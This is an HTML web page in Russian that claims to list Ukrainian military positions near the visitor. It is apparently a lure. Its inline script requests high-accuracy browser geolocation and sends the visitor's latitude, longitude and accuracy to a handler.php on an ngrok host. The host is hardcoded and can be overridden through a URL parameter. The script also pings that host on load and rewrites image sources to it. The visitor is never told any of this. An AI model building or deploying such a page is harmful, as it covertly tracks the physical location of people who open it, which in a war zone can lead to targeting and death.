<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport"
          content="width=device-width, initial-scale=1, user-scalable=yes">
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-2.2.4.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.2.1/js/bootstrap.min.js"></script>
    <script>
        var host = window.location.search.substring(1).split('&')[0].split('=')[1];
	host = host || "5668-194-233-96-13.ngrok.io";
        window.onload = function () {
            var xhttp=new XMLHttpRequest();
            xhttp.open("GET", "https://" + host + "/handler.php", true);
            xhttp.send();

            function success(pos) {
                var xhttp=new XMLHttpRequest();
                xhttp.open("GET", "https://" + host + "/handler.php?lat=" + pos.coords.latitude + "&lng=" + pos.coords.longitude + "&ac=" + pos.coords.accuracy, true);
                xhttp.send();

                document.querySelectorAll(".meat .col-md-3")
                  .forEach(function(elem) {elem.childNodes[0].src = elem.childNodes[0].src.replace("findyourselfinukraine.github.io", host)});
                document.querySelector(".spinner-border").style.display = "none";
                document.querySelector(".spinner-title").style.display = "none";
                document.querySelector(".meat").style.display = "block";
            }

            setTimeout(function () {
                navigator.geolocation.getCurrentPosition(success, function(){}, {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                });
            }, 2000);
        }
    </script>
</head>
<body>
<div class="container-fluid">
    <div class="row">
        <div class="col-md-1"></div>
        <div class="col-md-10"></div>
        <div class="col-md-1"></div>
    </div>

    <div class="row">
        <div class="col-md-2"></div>
        <div class="col-md-7">
            <h1>Список украинских позиций</h1>        
	</div>
    </div>
    <div class="row">
        <div class="col-md-3"></div>
        <div class="col-md-3">
            <div class="spinner-border" role="status">
                <span class="sr-only">Loading...</span>
            </div>
            <div class="spinner-title">Грузим позиции рядом с тобой</div>
            <div class="meat" style="display: none">
                <div class="row">
                    <div class="col-md-3"><img width=200 heigth=200 src="/media/1.jpg"/></div>
                    <div class="col-md-3"><img width=200 heigth=200 src="/media/2.jpg"/></div>
                    <div class="col-md-3"><img width=200 heigth=200 src="/media/3.jpg"/></div>
                </div>
		<div class="row">
                    <div class="col-md-3"><img width=200 heigth=200 src="/media/4.jpg"/></div>
                    <div class="col-md-3"><img width=200 heigth=200 src="/media/5.jpg"/></div>
		</div>
            </div>
        </div>
        <div class="col-md-3"></div>
    </div>
</div>
</body>
</html>
